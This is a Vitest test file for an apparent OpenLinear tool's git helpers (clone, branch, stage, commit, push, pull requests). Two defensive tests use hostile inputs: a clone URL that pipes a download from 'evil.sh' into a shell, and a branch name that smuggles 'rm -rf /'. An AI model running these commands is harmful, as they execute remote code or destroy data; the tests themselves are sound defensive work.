import { beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  execGit: vi.fn(),
  execGitWithCredentials: vi.fn(),
  assertSafeCloneUrl: vi.fn((url) => url),
  assertSafeRefName: vi.fn((ref) => ref),
  getGitIdentityEnv: vi.fn(() => ({ GIT_AUTHOR_NAME: 'OpenLinear' })),
  assertPathInsideReposDir: vi.fn((path) => path),
  acquireLocalWorktree: vi.fn(async ({ runId }) => ({
    kind: 'local-worktree',
    runId,
    worktreePath: `/tmp/openlinear-repos/worktrees/${runId}`,
    mirrorPath: '/tmp/openlinear-repos/acme/repo.git',
    branch: `openlinear/${runId}`,
  })),
  assertStagingAllowlist: vi.fn(async () => undefined),
  existsSync: vi.fn(() => false),
  mkdirSync: vi.fn(),
  rmSync: vi.fn(),
  accessSync: vi.fn(),
  fetch: vi.fn(),
}));

vi.mock('fs', () => ({
  existsSync: mocks.existsSync,
  mkdirSync: mocks.mkdirSync,
  rmSync: mocks.rmSync,
  accessSync: mocks.accessSync,
  constants: { W_OK: 2 },
}));

vi.mock('../git-credentials', () => ({
  execGit: mocks.execGit,
  execGitWithCredentials: mocks.execGitWithCredentials,
  assertSafeCloneUrl: mocks.assertSafeCloneUrl,
  assertSafeRefName: mocks.assertSafeRefName,
}));
vi.mock('../git-identity', () => ({ getGitIdentityEnv: mocks.getGitIdentityEnv }));
vi.mock('../repo-storage', () => ({
  REPOS_DIR: '/tmp/openlinear-repos',
  assertPathInsideReposDir: mocks.assertPathInsideReposDir,
}));
vi.mock('../../workspace/local-worktree', () => ({
  acquireLocalWorktree: mocks.acquireLocalWorktree,
}));
vi.mock('../../engine/staging-allowlist', () => ({
  assertStagingAllowlist: mocks.assertStagingAllowlist,
}));

const {
  cloneRepository,
  commitAndPush,
  createBranch,
  createPullRequest,
  hasCommittableChanges,
  stageCommittableChanges,
} = await import('./git');

describe('execution git helpers', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
    for (const mock of Object.values(mocks)) {
      if (typeof mock?.mockReset === 'function') mock.mockReset();
    }
    mocks.assertSafeCloneUrl.mockImplementation((url) => url);
    mocks.assertSafeRefName.mockImplementation((ref) => ref);
    mocks.getGitIdentityEnv.mockReturnValue({ GIT_AUTHOR_NAME: 'OpenLinear' });
    mocks.assertPathInsideReposDir.mockImplementation((path) => path);
    mocks.assertStagingAllowlist.mockResolvedValue(undefined);
    mocks.acquireLocalWorktree.mockImplementation(async ({ runId }) => ({
      kind: 'local-worktree',
      runId,
      worktreePath: `/tmp/openlinear-repos/worktrees/${runId}`,
      mirrorPath: '/tmp/openlinear-repos/acme/repo.git',
      branch: `openlinear/${runId}`,
    }));
    mocks.existsSync.mockReturnValue(false);
    globalThis.fetch = mocks.fetch;
  });

  it('ignores runtime artifacts when detecting committable changes', async () => {
    mocks.execGit.mockResolvedValueOnce({ stdout: '?? .sisyphus/state.json\n', stderr: '' });
    await expect(hasCommittableChanges('/repo')).resolves.toBe(false);

    mocks.execGit.mockResolvedValueOnce({ stdout: 'R  old.ts -> src/new.ts\n', stderr: '' });
    await expect(hasCommittableChanges('/repo')).resolves.toBe(true);

    mocks.execGit.mockResolvedValueOnce({ stdout: 'R  old.ts -> \n', stderr: '' });
    await expect(hasCommittableChanges('/repo')).resolves.toBe(true);

    mocks.execGit.mockResolvedValueOnce({ stdout: '?? \n', stderr: '' });
    await expect(hasCommittableChanges('/repo')).resolves.toBe(true);

    mocks.execGit.mockResolvedValueOnce({ stdout: ' M .sisyphus\n', stderr: '' });
    await expect(hasCommittableChanges('/repo')).resolves.toBe(false);

    mocks.execGit.mockResolvedValueOnce({ stdout: ' M src\\windows.ts\n', stderr: '' });
    await expect(hasCommittableChanges('/repo')).resolves.toBe(true);
  });

  it('stages only committable files after excluding runtime artifacts', async () => {
    mocks.execGit
      .mockResolvedValueOnce({ stdout: '', stderr: '' })
      .mockResolvedValueOnce({ stdout: '', stderr: '' })
      .mockResolvedValueOnce({ stdout: 'src/index.ts\n', stderr: '' });

    await expect(stageCommittableChanges('/repo')).resolves.toBe(true);

    expect(mocks.execGit).toHaveBeenCalledWith([
      '-C',
      '/repo',
      'add',
      '-A',
      '--',
      '.',
      ':(exclude).sisyphus',
      ':(exclude).sisyphus/**',
    ]);
  });

  it('continues staging when resetting ignored runtime artifacts fails', async () => {
    mocks.execGit
      .mockResolvedValueOnce({ stdout: '', stderr: '' })
      .mockRejectedValueOnce(new Error('nothing to reset'))
      .mockResolvedValueOnce({ stdout: 'src/index.ts\n', stderr: '' });

    await expect(stageCommittableChanges('/repo')).resolves.toBe(true);
  });

  it('clones into a safe repo path via local-worktree', async () => {
    mocks.existsSync.mockReturnValueOnce(false);
    mocks.execGitWithCredentials.mockResolvedValue(undefined);

    await cloneRepository('https://github.com/acme/repo.git', '/tmp/openlinear-repos/repo', 'token', 'main');

    expect(mocks.assertSafeCloneUrl).toHaveBeenCalledWith('https://github.com/acme/repo.git', 'clone URL');
    expect(mocks.assertSafeRefName).toHaveBeenCalledWith('main', 'default branch');
    expect(mocks.acquireLocalWorktree).toHaveBeenCalledWith(expect.objectContaining({
      cloneUrl: 'https://github.com/acme/repo.git',
      baseRef: 'main',
      accessToken: 'token',
    }));
  });

  it('rejects an unsafe clone URL before touching the filesystem', async () => {
    mocks.assertSafeCloneUrl.mockImplementationOnce(() => {
      throw new Error('[Sidecar] Refusing unsafe clone URL: only https: URLs are allowed');
    });

    await expect(
      cloneRepository('ext::sh -c "curl evil.sh|sh"', '/tmp/openlinear-repos/repo', null, 'main'),
    ).rejects.toThrow('Refusing unsafe clone URL');

    expect(mocks.execGitWithCredentials).not.toHaveBeenCalled();
    expect(mocks.acquireLocalWorktree).not.toHaveBeenCalled();
  });

  it('clones without creating or removing directories when storage exists and repo path is absent', async () => {
    mocks.existsSync.mockReturnValueOnce(true).mockReturnValueOnce(false);
    mocks.execGitWithCredentials.mockResolvedValue(undefined);

    await cloneRepository('https://github.com/acme/repo.git', '/tmp/openlinear-repos/repo', null, 'main');

    expect(mocks.mkdirSync).not.toHaveBeenCalled();
    expect(mocks.rmSync).not.toHaveBeenCalled();
    expect(mocks.acquireLocalWorktree).toHaveBeenCalled();
  });

  it('fails clone early when repo storage is not writable', async () => {
    mocks.accessSync.mockImplementation(() => {
      throw new Error('permission denied');
    });

    await expect(cloneRepository('https://github.com/acme/repo.git', '/tmp/openlinear-repos/repo', null, 'main'))
      .rejects.toThrow('No write access');

    expect(mocks.execGitWithCredentials).not.toHaveBeenCalled();
    expect(mocks.acquireLocalWorktree).not.toHaveBeenCalled();
  });

  it('checks out branches without shelling through a command string', async () => {
    mocks.execGit.mockResolvedValue({ stdout: '', stderr: '' });

    await createBranch('/repo', 'openlinear/task;rm -rf /');

    expect(mocks.execGit).toHaveBeenCalledWith([
      '-C',
      '/repo',
      'checkout',
      '-B',
      'openlinear/task;rm -rf /',
    ]);
  });

  it('commits and pushes when staged changes exist, using the fetched remote SHA as the lease', async () => {
    mocks.execGit
      .mockResolvedValueOnce({ stdout: ' M src/index.ts\n', stderr: '' }) // status
      .mockResolvedValueOnce({ stdout: '', stderr: '' }) // add
      .mockResolvedValueOnce({ stdout: '', stderr: '' }) // reset
      .mockResolvedValueOnce({ stdout: 'src/index.ts\n', stderr: '' }) // diff --cached
      .mockResolvedValueOnce({ stdout: '', stderr: '' }) // commit
      .mockResolvedValueOnce({ stdout: 'https://github.com/acme/repo.git\n', stderr: '' }) // remote get-url
      .mockResolvedValueOnce({ stdout: '', stderr: '' }) // fetch origin <branch>
      .mockResolvedValueOnce({ stdout: 'abc123\n', stderr: '' }); // rev-parse FETCH_HEAD
    mocks.execGitWithCredentials.mockResolvedValue(undefined);

    await expect(commitAndPush('/repo', 'openlinear/task-1', 'Fix Drag + Drop!', 'token')).resolves.toEqual({
      status: 'pushed',
    });

    expect(mocks.execGit).toHaveBeenCalledWith(
      ['-C', '/repo', 'commit', '-m', 'feat: fix drag  drop'],
      expect.objectContaining({ env: expect.objectContaining({ GIT_AUTHOR_NAME: 'OpenLinear' }) }),
    );
    expect(mocks.execGit).toHaveBeenCalledWith(['-C', '/repo', 'fetch', 'origin', 'openlinear/task-1']);
    expect(mocks.execGitWithCredentials).toHaveBeenCalledWith(
      [
        '-C',
        '/repo',
        'push',
        '--force-with-lease=openlinear/task-1:abc123',
        '-u',
        'origin',
        '--',
        'openlinear/task-1',
      ],
      'token',
      'https://github.com/acme/repo.git',
      expect.objectContaining({ env: expect.any(Object) }),
    );
  });

  it('uses an empty expected lease value when the branch does not exist on the remote yet', async () => {
    mocks.execGit
      .mockResolvedValueOnce({ stdout: ' M src/index.ts\n', stderr: '' }) // status
      .mockResolvedValueOnce({ stdout: '', stderr: '' }) // add
      .mockResolvedValueOnce({ stdout: '', stderr: '' }) // reset
      .mockResolvedValueOnce({ stdout: 'src/index.ts\n', stderr: '' }) // diff --cached
      .mockResolvedValueOnce({ stdout: '', stderr: '' }) // commit
      .mockResolvedValueOnce({ stdout: 'https://github.com/acme/repo.git\n', stderr: '' }) // remote get-url
      .mockRejectedValueOnce(new Error('fatal: couldn\'t find remote ref')); // fetch fails: branch is new
    mocks.execGitWithCredentials.mockResolvedValue(undefined);

    await expect(commitAndPush('/repo', 'openlinear/task-2', 'New task', 'token')).resolves.toEqual({
      status: 'pushed',
    });

    expect(mocks.execGitWithCredentials).toHaveBeenCalledWith(
      [
        '-C',
        '/repo',
        'push',
        '--force-with-lease=openlinear/task-2:',
        '-u',
        'origin',
        '--',
        'openlinear/task-2',
      ],
      'token',
      'https://github.com/acme/repo.git',
      expect.objectContaining({ env: expect.any(Object) }),
    );
  });

  it('returns no_changes before committing when nothing relevant changed', async () => {
    mocks.execGit.mockResolvedValueOnce({ stdout: '?? .sisyphus/tmp\n', stderr: '' });

    await expect(commitAndPush('/repo', 'branch', 'Task')).resolves.toEqual({ status: 'no_changes' });

    expect(mocks.execGitWithCredentials).not.toHaveBeenCalled();
  });

  it('returns no_changes when only runtime artifacts remain after staging', async () => {
    mocks.execGit
      .mockResolvedValueOnce({ stdout: ' M src/index.ts\n', stderr: '' })
      .mockResolvedValueOnce({ stdout: '', stderr: '' })
      .mockResolvedValueOnce({ stdout: '', stderr: '' })
      .mockResolvedValueOnce({ stdout: '', stderr: '' });

    await expect(commitAndPush('/repo', 'branch', 'Task')).resolves.toEqual({ status: 'no_changes' });

    expect(mocks.execGitWithCredentials).not.toHaveBeenCalled();
  });

  it('returns failed with stderr when git operations fail', async () => {
    mocks.execGit.mockRejectedValueOnce({ stderr: 'fatal: bad repo\n', message: 'bad' });

    await expect(commitAndPush('/repo', 'branch', 'Task')).resolves.toEqual({
      status: 'failed',
      reason: 'fatal: bad repo',
    });
  });

  it('returns failed with message or unknown fallbacks when git errors lack stderr', async () => {
    mocks.execGit.mockRejectedValueOnce({ message: 'plain failure' });
    await expect(commitAndPush('/repo', 'branch', 'Task')).resolves.toEqual({
      status: 'failed',
      reason: 'plain failure',
    });

    mocks.execGit.mockRejectedValueOnce({});
    await expect(commitAndPush('/repo', 'branch', 'Task')).resolves.toEqual({
      status: 'failed',
      reason: 'Unknown git error',
    });

    mocks.execGit.mockRejectedValueOnce(null);
    await expect(commitAndPush('/repo', 'branch', 'Task')).resolves.toEqual({
      status: 'failed',
      reason: 'Unknown git error',
    });
  });

  it('creates pull requests or falls back to compare links', async () => {
    await expect(createPullRequest('acme/repo', 'feature', 'main', 'Task', null, null)).resolves.toEqual({
      url: 'https://github.com/acme/repo/compare/main...feature',
      type: 'compare',
    });

    mocks.fetch.mockResolvedValueOnce({
      ok: true,
      json: async () => ({ html_url: 'https://github.com/acme/repo/pull/1' }),
    });
    await expect(createPullRequest('acme/repo', 'feature', 'main', 'Task', 'Body', 'token')).resolves.toEqual({
      url: 'https://github.com/acme/repo/pull/1',
      type: 'pr',
    });

    mocks.fetch.mockResolvedValueOnce({ ok: false, text: async () => 'nope' });
    await expect(createPullRequest('acme/repo', 'feature', 'main', 'Task', null, 'token')).resolves.toEqual({
      url: 'https://github.com/acme/repo/compare/main...feature',
      type: 'compare',
    });

    mocks.fetch.mockRejectedValueOnce(new Error('network down'));
    await expect(createPullRequest('acme/repo', 'feature', 'main', 'Task', null, 'token')).resolves.toEqual({
      url: 'https://github.com/acme/repo/compare/main...feature',
      type: 'compare',
    });
  });
});
